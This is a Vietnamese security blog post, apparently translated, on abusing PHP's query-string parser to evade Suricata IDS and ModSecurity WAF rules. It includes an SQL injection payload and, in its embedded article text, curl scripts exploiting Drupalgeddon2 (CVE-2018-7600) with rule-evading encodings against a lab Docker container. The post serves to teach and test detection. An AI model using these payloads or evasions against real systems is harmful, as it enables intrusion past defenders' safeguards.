<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Sử dụng PHP query string parser để qua mặt IDS, IPS và WAF | minhtuanact|Blog - Keep a flame in the rain!</title><meta name=keywords content="CyberSecurity,PHP,bypass"><meta name=description content="Mở đầu  Như bạn đã biết, PHP converts query string (trong URL hoặc body) thành một mảng bên trong $_GET hoặc $_POST. Ví dụ: /?foo=bar sẽ trở thành Array([foo] => &#34;bar&#34;). Query string parsing sẽ loại bỏ hoặc thay thế một số ký tự trong tên đối số bằng dấu gạch dưới. Ví dụ: /?%20news[id%00=42 sẽ được chuyển thành Array([news_id] => 42). Nếu IDS/IPS hoặc WAF có rules chặn hoặc ghi nhật ký các giá trị không phải là số trong tham số news_id thì có thể bỏ qua bằng cách sử dụng parsing process với nội dung như sau: 1  /news."><meta name=author content="minhtuanact"><link rel=canonical href=https://minhtuanact.ml/posts/su-dung-php-query-string-parser-de-qua-mat-ids-ips-va-waf-3p0lp9yo5ox/><link crossorigin=anonymous href=/assets/css/stylesheet.min.48a18943c2fc15c38a372b8dde1f5e5dc0bc64fa6cb90f5a817d2f8c76b7f3ae.css integrity="sha256-SKGJQ8L8FcOKNyuN3h9eXcC8ZPpsuQ9agX0vjHa3864=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.min.4dcb3c4f38462f66c6b6137227726f5543cb934cca9788f041c087e374491df2.js integrity="sha256-Tcs8TzhGL2bGthNyJ3JvVUPLk0zKl4jwQcCH43RJHfI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://minhtuanact.ml/cat-icon-png-3.png><link rel=icon type=image/png sizes=16x16 href=https://minhtuanact.ml/cat-icon-png-3.png><link rel=icon type=image/png sizes=32x32 href=https://minhtuanact.ml/cat-icon-png-3.png><link rel=apple-touch-icon href=https://minhtuanact.ml/cat-icon-png-3.png><link rel=mask-icon href=https://minhtuanact.ml/cat-icon-png-3.png><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,o,i,a,t,n,s){e.GoogleAnalyticsObject=t,e[t]=e[t]||function(){(e[t].q=e[t].q||[]).push(arguments)},e[t].l=1*new Date,n=o.createElement(i),s=o.getElementsByTagName(i)[0],n.async=1,n.src=a,s.parentNode.insertBefore(n,s)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="Sử dụng PHP query string parser để qua mặt IDS, IPS và WAF"><meta property="og:description" content="Mở đầu  Như bạn đã biết, PHP converts query string (trong URL hoặc body) thành một mảng bên trong $_GET hoặc $_POST. Ví dụ: /?foo=bar sẽ trở thành Array([foo] => &#34;bar&#34;). Query string parsing sẽ loại bỏ hoặc thay thế một số ký tự trong tên đối số bằng dấu gạch dưới. Ví dụ: /?%20news[id%00=42 sẽ được chuyển thành Array([news_id] => 42). Nếu IDS/IPS hoặc WAF có rules chặn hoặc ghi nhật ký các giá trị không phải là số trong tham số news_id thì có thể bỏ qua bằng cách sử dụng parsing process với nội dung như sau: 1  /news."><meta property="og:type" content="article"><meta property="og:url" content="https://minhtuanact.ml/posts/su-dung-php-query-string-parser-de-qua-mat-ids-ips-va-waf-3p0lp9yo5ox/"><meta property="og:image" content="https://minhtuanact.ml/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2019-07-09T14:46:26+07:00"><meta property="article:modified_time" content="2019-07-09T14:46:26+07:00"><meta property="og:site_name" content="minhtuanact|Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://minhtuanact.ml/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Sử dụng PHP query string parser để qua mặt IDS, IPS và WAF"><meta name=twitter:description content="Mở đầu  Như bạn đã biết, PHP converts query string (trong URL hoặc body) thành một mảng bên trong $_GET hoặc $_POST. Ví dụ: /?foo=bar sẽ trở thành Array([foo] => &#34;bar&#34;). Query string parsing sẽ loại bỏ hoặc thay thế một số ký tự trong tên đối số bằng dấu gạch dưới. Ví dụ: /?%20news[id%00=42 sẽ được chuyển thành Array([news_id] => 42). Nếu IDS/IPS hoặc WAF có rules chặn hoặc ghi nhật ký các giá trị không phải là số trong tham số news_id thì có thể bỏ qua bằng cách sử dụng parsing process với nội dung như sau: 1  /news."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://minhtuanact.ml/posts/"},{"@type":"ListItem","position":2,"name":"Sử dụng PHP query string parser để qua mặt IDS, IPS và WAF","item":"https://minhtuanact.ml/posts/su-dung-php-query-string-parser-de-qua-mat-ids-ips-va-waf-3p0lp9yo5ox/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Sử dụng PHP query string parser để qua mặt IDS, IPS và WAF","name":"Sử dụng PHP query string parser để qua mặt IDS, IPS và WAF","description":"Mở đầu  Như bạn đã biết, PHP converts query string (trong URL hoặc body) thành một mảng bên trong $_GET hoặc $_POST. Ví dụ: /?foo=bar sẽ trở thành Array([foo] =\u0026gt; \u0026quot;bar\u0026quot;). Query string parsing sẽ loại bỏ hoặc thay thế một số ký tự trong tên đối số bằng dấu gạch dưới. Ví dụ: /?%20news[id%00=42 sẽ được chuyển thành Array([news_id] =\u0026gt; 42). Nếu IDS/IPS hoặc WAF có rules chặn hoặc ghi nhật ký các giá trị không phải là số trong tham số news_id thì có thể bỏ qua bằng cách sử dụng parsing process với nội dung như sau: 1  /news.","keywords":["CyberSecurity","PHP","bypass"],"articleBody":"Mở đầu  Như bạn đã biết, PHP converts query string (trong URL hoặc body) thành một mảng bên trong $_GET hoặc $_POST. Ví dụ: /?foo=bar sẽ trở thành Array([foo] = \"bar\"). Query string parsing sẽ loại bỏ hoặc thay thế một số ký tự trong tên đối số bằng dấu gạch dưới. Ví dụ: /?%20news[id%00=42 sẽ được chuyển thành Array([news_id] = 42). Nếu IDS/IPS hoặc WAF có rules chặn hoặc ghi nhật ký các giá trị không phải là số trong tham số news_id thì có thể bỏ qua bằng cách sử dụng parsing process với nội dung như sau: 1  /news.php?%20news[id%00=42\"+AND+1=0--    Trong PHP, giá trị của argument name trong ví dụ trên %20news[id%00 sẽ được lưu trữ tại $_GET[\"news_id\"].  Tại sao   PHP cần chuyển đổi tất cả các đối số thành một tên biến hợp lệ, vì vậy khi chuỗi truy vấn được phân tích, nó thực hiện 2 điều chính:\n Loại bỏ khoảng trắng ban đầu Chuyển đổi một số ký tự thành dấu gạch dưới (bao gồm cả khoảng trắng)    Ví dụ\n   USER INPUT DECODED PHP VARIABLE NAME     %20foo_bar%00 foo_bar foo_bar   foo%20bar%00 foo bar foo_bar   foo%5bbar foo[bar foo_bar      Với một vòng lặp đơn giản như sau, bạn có thể kiểm tra xem ký tự nào bị xóa hoặc chuyển đổi thành dấu gạch dưới bằng cách sử dụng hàm parser_str: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  php foreach( [ \"{chr}foo_bar\", \"foo{chr}bar\", \"foo_bar{chr}\" ] as $k = $arg) { for($i=0;$i255;$i++) { echo \"\\033[999D\\033[K\\r\"; echo \"[\".$arg.\"] check \".bin2hex(chr($i)).\"\"; parse_str(str_replace(\"{chr}\",chr($i),$arg).\"=bla\",$o); /* yes... I've added a sleep time on each loop just for the scenic effect :) like that movie with unrealistic brute-force where the password are obtained one byte at a time (∩｀-´)⊃━☆ﾟ.*･｡ﾟ */ usleep(5000); if(isset($o[\"foo_bar\"])) { echo \"\\033[999D\\033[K\\r\"; echo $arg.\" - \".bin2hex(chr($i)).\" (\".chr($i).\")\\n\"; } } echo \"\\033[999D\\033[K\\r\"; echo \"\\n\"; }     pasrse_str được sử dụng qua GET, POST và cookie. Cũng tương tự với các tiêu đề nếu server web của bạn chấp nhận tên tiêu đề có dấu chấm hoặc khoảng trắng. Tôi đã thực hiện 3 lần vòng lặp ở trên, liệt kê tất cả các kí tự ascii từ 0 đến 255 ở cả 2 đầu của tên tham số và thay vì dấu gạch dưới, đây là kết quả thu được:\n [1st]foo_bar foo[2nd]bar foo_bar[3rd]     Trong sơ đồ trên, foo%20bar và foo+bar là tương đương với foo bar.\n  Suricata   Đối với những người k biết, Suricata là “một công cụ phát hiện mối đe dọa mã nguồn mở, nhanh và mạnh mẽ” và công cụ của nó có khả năng phát hiện xâm nhập thời gian thực (IDS), hệ thống ngăn ngừa xâm nhập (IPS), giám sát an ninh mạng (NSM) và xử lý pcap ngoại tuyến.\n  Với Suricata, bạn có thể viết 1 rule kiểm tra HTTP traffic. Giả sử bạn viết 1 rule:\n1 2 3 4 5 6  alert http any any - $HOME_NET any (\\  msg: \"Block SQLi\"; flow:established,to_server;\\  content: \"POST\"; http_method;\\  pcre: \"/news_id=[^0-9]+/Pi\";\\  sid:1234567;\\ )     Rule kiểm tra nếu news_id có một giá trị không phải là số. Trong PHP nó có thể dễ dàng bypass sử dụng trình phân tích cú pháp chuỗi truy vấn của nó, giống như vài ví dụ sau đây:\n  Tìm kiếm trên google và github, tôi tìm thấy rằng có nhiều quy tắc Suricata cho PHP có thể được bỏ qua bằng cách thay thế dấu gạch dưới, thêm byte rỗng hoặc khoảng trắng trong tên đối số được kiểm tra. Một ví dụ thực tế:   Như chúng ta đã thấy, nó có thể bỏ qua bởi\n1  /view.php?i%00=1\u0026%20key=d3b07384d113edec49eaa6238ad5ff00     Có thể thay vị trí đối số như\n1  /view.php?key=d3b07384d113edec49eaa6238ad5ff00\u0026i=1     WAF (ModSecurity)  PHP query string paser cũng có thể bị sử dụng để bỏ qua các quy tắc của WAF. Hãy tưởng tượng một quy tắc ModSecurty như SecRule! !ARGS:news_id \"@rx ^[0-9]+$\" \"block\" thiên về bypass technique. May mắn thay, trong ModSecurity bạn chỉ có thể chỉ định 1 query string bằng một REGEX. Ví dụ: 1  SecRule !ARGS:/news.id/ \"@rx ^[0-9]+$\" \"block\"   Điều này sẽ chặn các yêu cầu sau:  PoC || GTFO  Bây giờ tôi có thể tạo PoC với Suricata và Drupal CMS với exploit CVE-2018-7600 (Drupalgeddon2 Remote Code Execution). Để đơn giản hơn, tôi sẽ chạy Suricata và Drupal trên 2 con container docker và tôi sẽ cố gắng khai thác Drupal từ container Suricata. Tôi sẽ active 2 rules bên Suricata:  A custom rule that blocks form_id=user_register_form A Positive Technologies Suricata rule for CVE-2018-7600    Để cài đặt Suricata, tôi đã làm theo hướng dẫn ở trên trang chủ, và đối với Drupal, tôi đã chạy vulhub mà bạn có thể clone ở đây: Vulhub Drupal   Ok rồi, tất cả đã xong, giờ mình có thể sử dụng exploit CVE-2018-7600. Tôi muốn tạo một số bash script mà thực hiện curl, ví dụ: 1 2 3 4 5 6 7  #!/bin/bash  URL=\"/user/register?element_parents=account/mail/%23value\u0026ajax_form=1\u0026_wrapper_format=drupal_ajax\" QSTRING=\"form_id=user_register_form\u0026_drupal_ajax=1\u0026mail[#post_render][]=exec\u0026mail[#type]=markup\u0026mail[#markup]=\" COMMAND=\"id\" curl -v -d \"${QSTRING}${COMMAND}\" \"http://172.17.0.1:8080$URL\"   Như bạn có thể thấy, đoạn script trên thực thi lệnh “id”. Thử nó xem nào  Nào, bây giờ thử import 2 rules vào Suricata. Tôi đã viết cái đầu tiên, và nó cố gắng khớp form_id=user_register_form vào bên trong 1 request body. Cố gắng viết 1 cái thứ 2 /user/register trong request URL và nó trông giống như #post_render trong request body. My rule:   PT rule:    Sau đó restart Suricata, tôi đã sẵn sang để khai khác xem liệu 2 quy tắc trên có chặn được việc khai thác của tôi không.   Úi trời, tôi đã có 2 bản ghi Suricata:\n ATTACK [PTsecurity] Drupalgeddon2 172.17.0.1:8080 Possible Drupalgeddon2 attack [Priority: 3] {PROTO:006} 172.17.0.6:51702 - 172.17.0.1:    Bypass all the things!  Cả 2 quy tắc này dễ dàng để bypass. Tôi đã thấy được làm thế nào để bypass rule của tôi với việc lạm dụng PHP query string parser. Tôi có thể thay thế form_id=user_register_form bằng một vài thứ khác như: 1  form%5bid=user_register_form    Như bạn có thể thấy được, chỉ có quy tắc PT là phù hợp. Phân tích PT, chúng ta thấy rằng nó khớp với # và phiên bản được mã hóa %23. Chúng ta chỉ có thể bypass bằng cách sử dụng post%5frender thay vì post_render.  Cả 2 rules đã được bỏ qua bởi exploit sau: 1 2 3 4 5 6 7  #!/bin/bash  URL=\"/user/register?element_parents=account/mail/%23value\u0026ajax_form=1\u0026_wrapper_format=drupal_ajax\" QSTRING=\"form%5bid=user_register_form\u0026_drupal_ajax=1\u0026mail[#post%5frender][]=exec\u0026mail[#type]=markup\u0026mail[#markup]=\" COMMAND=\"id\" curl -v -d \"${QSTRING}${COMMAND}\" \"http://172.17.0.1:8080$URL\"     Tổng kết  Nếu các bạn cảm thấy bài viết hay và có ích, mình xin 1 upvote và 1 share nhé :D Nguồn: https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/  ","wordCount":"1110","inLanguage":"en","datePublished":"2019-07-09T14:46:26+07:00","dateModified":"2019-07-09T14:46:26+07:00","author":{"@type":"Person","name":"minhtuanact"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://minhtuanact.ml/posts/su-dung-php-query-string-parser-de-qua-mat-ids-ips-va-waf-3p0lp9yo5ox/"},"publisher":{"@type":"Organization","name":"minhtuanact|Blog - Keep a flame in the rain!","logo":{"@type":"ImageObject","url":"https://minhtuanact.ml/cat-icon-png-3.png"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://minhtuanact.ml/ accesskey=h title="minhtuanact|Blog (Alt + H)"><img src=https://minhtuanact.ml/cat-icon-png-3.png alt=logo aria-label=logo height=35>minhtuanact|Blog</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://minhtuanact.ml/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li><li><a href=https://minhtuanact.ml/tags/ title=tags><span>tags</span></a></li><li><a href=https://minhtuanact.ml/wedding title=wedding><span>wedding</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://minhtuanact.ml/>Home</a>&nbsp;»&nbsp;<a href=https://minhtuanact.ml/posts/>Posts</a></div><h1 class=post-title>Sử dụng PHP query string parser để qua mặt IDS, IPS và WAF</h1><div class=post-meta><span title="2019-07-09 14:46:26 +0700 +0700">July 9, 2019</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;minhtuanact</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#m%e1%bb%9f-%c4%91%e1%ba%a7u aria-label="Mở đầu">Mở đầu</a></li><li><a href=#t%e1%ba%a1i-sao aria-label="Tại sao">Tại sao</a></li><li><a href=#suricata aria-label=Suricata>Suricata</a></li><li><a href=#waf-modsecurity aria-label="WAF (ModSecurity)">WAF (ModSecurity)</a></li><li><a href=#poc--gtfo aria-label="PoC || GTFO">PoC || GTFO</a></li><li><a href=#bypass-all-the-things aria-label="Bypass all the things!">Bypass all the things!</a></li><li><a href=#t%e1%bb%95ng-k%e1%ba%bft aria-label="Tổng kết">Tổng kết</a></li></ul></div></details></div><div class=post-content><h2 id=mở-đầu>Mở đầu<a hidden class=anchor aria-hidden=true href=#mở-đầu>#</a></h2><ul><li>Như bạn đã biết, PHP converts query string (trong URL hoặc body) thành một mảng bên trong <code>$_GET</code> hoặc <code>$_POST</code>.</li><li>Ví dụ: <code>/?foo=bar</code> sẽ trở thành <code>Array([foo] => "bar")</code>. Query string parsing sẽ loại bỏ hoặc thay thế một số ký tự trong tên đối số bằng dấu gạch dưới. Ví dụ: <code>/?%20news[id%00=42</code> sẽ được chuyển thành <code>Array([news_id] => 42)</code>. Nếu IDS/IPS hoặc WAF có rules chặn hoặc ghi nhật ký các giá trị không phải là số trong tham số <code>news_id</code> thì có thể bỏ qua bằng cách sử dụng parsing process với nội dung như sau:<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>/</span><span class=nx>news</span><span class=o>.</span><span class=nx>php</span><span class=o>?%</span><span class=mi>20</span><span class=nx>news</span><span class=p>[</span><span class=nx>id</span><span class=o>%</span><span class=mo>00</span><span class=o>=</span><span class=mi>42</span><span class=s2>&#34;+AND+1=0--
</span></span></span></code></pre></td></tr></table></div></div></li><li>Trong PHP, giá trị của argument name trong ví dụ trên <code>%20news[id%00</code> sẽ được lưu trữ tại <code>$_GET["news_id"]</code>.</li></ul><h2 id=tại-sao>Tại sao<a hidden class=anchor aria-hidden=true href=#tại-sao>#</a></h2><ul><li><p>PHP cần chuyển đổi tất cả các đối số thành một tên biến hợp lệ, vì vậy khi chuỗi truy vấn được phân tích, nó thực hiện 2 điều chính:</p><ul><li>Loại bỏ khoảng trắng ban đầu</li><li>Chuyển đổi một số ký tự thành dấu gạch dưới (bao gồm cả khoảng trắng)</li></ul></li><li><p>Ví dụ</p><table><thead><tr><th>USER INPUT</th><th>DECODED</th><th>PHP VARIABLE NAME</th></tr></thead><tbody><tr><td>%20foo_bar%00</td><td>foo_bar</td><td>foo_bar</td></tr><tr><td>foo%20bar%00</td><td>foo bar</td><td>foo_bar</td></tr><tr><td>foo%5bbar</td><td>foo[bar</td><td>foo_bar</td></tr></tbody></table></li><li><p>Với một vòng lặp đơn giản như sau, bạn có thể kiểm tra xem ký tự nào bị xóa hoặc chuyển đổi thành dấu gạch dưới bằng cách sử dụng hàm <code>parser_str</code>:
<img loading=lazy src=https://images.viblo.asia/c0190f89-5e0a-4810-9160-c2013dc92e02.gif alt></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>foreach</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=p>[</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;{chr}foo_bar&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;foo{chr}bar&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;foo_bar{chr}&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>]</span> <span class=k>as</span> <span class=nv>$k</span> <span class=o>=&gt;</span> <span class=nv>$arg</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>for</span><span class=p>(</span><span class=nv>$i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=nv>$i</span><span class=o>&lt;=</span><span class=mi>255</span><span class=p>;</span><span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>echo</span> <span class=s2>&#34;</span><span class=se>\033</span><span class=s2>[999D</span><span class=se>\033</span><span class=s2>[K</span><span class=se>\r</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>echo</span> <span class=s2>&#34;[&#34;</span><span class=o>.</span><span class=nv>$arg</span><span class=o>.</span><span class=s2>&#34;] check &#34;</span><span class=o>.</span><span class=nx>bin2hex</span><span class=p>(</span><span class=nx>chr</span><span class=p>(</span><span class=nv>$i</span><span class=p>))</span><span class=o>.</span><span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=nx>parse_str</span><span class=p>(</span><span class=nx>str_replace</span><span class=p>(</span><span class=s2>&#34;{chr}&#34;</span><span class=p>,</span><span class=nx>chr</span><span class=p>(</span><span class=nv>$i</span><span class=p>),</span><span class=nv>$arg</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;=bla&#34;</span><span class=p>,</span><span class=nv>$o</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=cm>/* yes... I&#39;ve added a sleep time on each loop just for 
</span></span></span><span class=line><span class=cl><span class=cm>                the scenic effect :) like that movie with unrealistic 
</span></span></span><span class=line><span class=cl><span class=cm>                brute-force where the password are obtained 
</span></span></span><span class=line><span class=cl><span class=cm>                one byte at a time (∩｀-´)⊃━☆ﾟ.*･｡ﾟ 
</span></span></span><span class=line><span class=cl><span class=cm>                */</span>
</span></span><span class=line><span class=cl>                <span class=nx>usleep</span><span class=p>(</span><span class=mi>5000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$o</span><span class=p>[</span><span class=s2>&#34;foo_bar&#34;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>echo</span> <span class=s2>&#34;</span><span class=se>\033</span><span class=s2>[999D</span><span class=se>\033</span><span class=s2>[K</span><span class=se>\r</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                    <span class=k>echo</span> <span class=nv>$arg</span><span class=o>.</span><span class=s2>&#34; -&gt; &#34;</span><span class=o>.</span><span class=nx>bin2hex</span><span class=p>(</span><span class=nx>chr</span><span class=p>(</span><span class=nv>$i</span><span class=p>))</span><span class=o>.</span><span class=s2>&#34; (&#34;</span><span class=o>.</span><span class=nx>chr</span><span class=p>(</span><span class=nv>$i</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;)</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;</span><span class=se>\033</span><span class=s2>[999D</span><span class=se>\033</span><span class=s2>[K</span><span class=se>\r</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=https://images.viblo.asia/6ee7cd06-ff19-4578-acd0-f325c9b292ff.gif alt></p></li><li><p><code>pasrse_str</code> được sử dụng qua GET, POST và cookie. Cũng tương tự với các tiêu đề nếu server web của bạn chấp nhận tên tiêu đề có dấu chấm hoặc khoảng trắng. Tôi đã thực hiện 3 lần vòng lặp ở trên, liệt kê tất cả các kí tự ascii từ 0 đến 255 ở cả 2 đầu của tên tham số và thay vì dấu gạch dưới, đây là kết quả thu được:</p><ul><li>[1st]foo_bar</li><li>foo[2nd]bar</li><li>foo_bar[3rd]
<img loading=lazy src=https://images.viblo.asia/6d3ab218-f9f2-4d87-aa78-505971e0036d.png alt>
<img loading=lazy src=https://images.viblo.asia/f61e7348-c6b6-4dc4-93a7-ffb405cfd0ba.png alt></li></ul></li><li><p>Trong sơ đồ trên, <code>foo%20bar</code> và <code>foo+bar</code> là tương đương với <code>foo bar</code>.</p></li></ul><h2 id=suricata>Suricata<a hidden class=anchor aria-hidden=true href=#suricata>#</a></h2><ul><li><p>Đối với những người k biết, Suricata là &ldquo;một công cụ phát hiện mối đe dọa mã nguồn mở, nhanh và mạnh mẽ&rdquo; và công cụ của nó có khả năng phát hiện xâm nhập thời gian thực (IDS), hệ thống ngăn ngừa xâm nhập (IPS), giám sát an ninh mạng (NSM) và xử lý pcap ngoại tuyến.</p></li><li><p>Với Suricata, bạn có thể viết 1 rule kiểm tra HTTP traffic. Giả sử bạn viết 1 rule:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>alert http any any -&gt; <span class=nv>$HOME_NET</span> any <span class=o>(</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    msg: <span class=s2>&#34;Block SQLi&#34;</span><span class=p>;</span> flow:established,to_server<span class=p>;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    content: <span class=s2>&#34;POST&#34;</span><span class=p>;</span> http_method<span class=p>;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    pcre: <span class=s2>&#34;/news_id=[^0-9]+/Pi&#34;</span><span class=p>;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    sid:1234567<span class=p>;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=o>)</span>
</span></span></code></pre></td></tr></table></div></div></li><li><p>Rule kiểm tra nếu <code>news_id</code> có một giá trị không phải là số. Trong PHP nó có thể dễ dàng bypass sử dụng trình phân tích cú pháp chuỗi truy vấn của nó, giống như vài ví dụ sau đây:</p><p><img loading=lazy src=https://images.viblo.asia/c4004744-3e4a-4952-ac76-38c92092c195.png alt></p></li><li><p>Tìm kiếm trên google và github, tôi tìm thấy rằng có nhiều quy tắc Suricata cho PHP có thể được bỏ qua bằng cách thay thế dấu gạch dưới, thêm byte rỗng hoặc khoảng trắng trong tên đối số được kiểm tra. Một ví dụ thực tế:
<img loading=lazy src=https://images.viblo.asia/7e9a56ed-f3fe-40ab-a12b-49360f2c60cf.png alt></p></li><li><p>Như chúng ta đã thấy, nó có thể bỏ qua bởi</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/view.php?i%00=1&amp;%20key=d3b07384d113edec49eaa6238ad5ff00
</span></span></code></pre></td></tr></table></div></div></li><li><p>Có thể thay vị trí đối số như</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/view.php?key=d3b07384d113edec49eaa6238ad5ff00&amp;i=1
